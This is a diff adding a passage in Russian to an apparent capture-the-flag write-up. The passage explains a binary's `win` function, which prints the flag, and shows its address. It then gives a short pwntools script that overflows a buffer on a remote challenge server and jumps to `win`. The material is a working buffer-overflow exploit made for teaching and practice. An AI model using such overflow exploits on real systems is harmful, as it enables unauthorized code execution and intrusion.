@@ -22,6 +22,24 @@
 функция `win`: <br />
 ![image](https://github.com/user-attachments/assets/18956d69-e589-4c73-887a-6023e24e1daf) <br />
 
+Функция `win` просто открывает файл с флагом и выводит его содержимое на экран. Посмотрим адрес функции `win` для его дальнейшего использования в 
+скрипте, который переполнит буфер и перейдет на нужную функцию: <br />
+
+![image](https://github.com/user-attachments/assets/76d6298f-a3c0-4fa2-921c-f00c538f401a) <br />
+
+Это адрес `0x401162`. Теперь пишем скрипт: <br />
+
+```py
+from pwn import * 
+
+p = remote('109.233.56.90', 11605)
+p.sendline(b"AAAAAAAAAAAAAAAA" + p64(0x401162))
+p.interactive()
+```
+
+
+
+
 
 
 
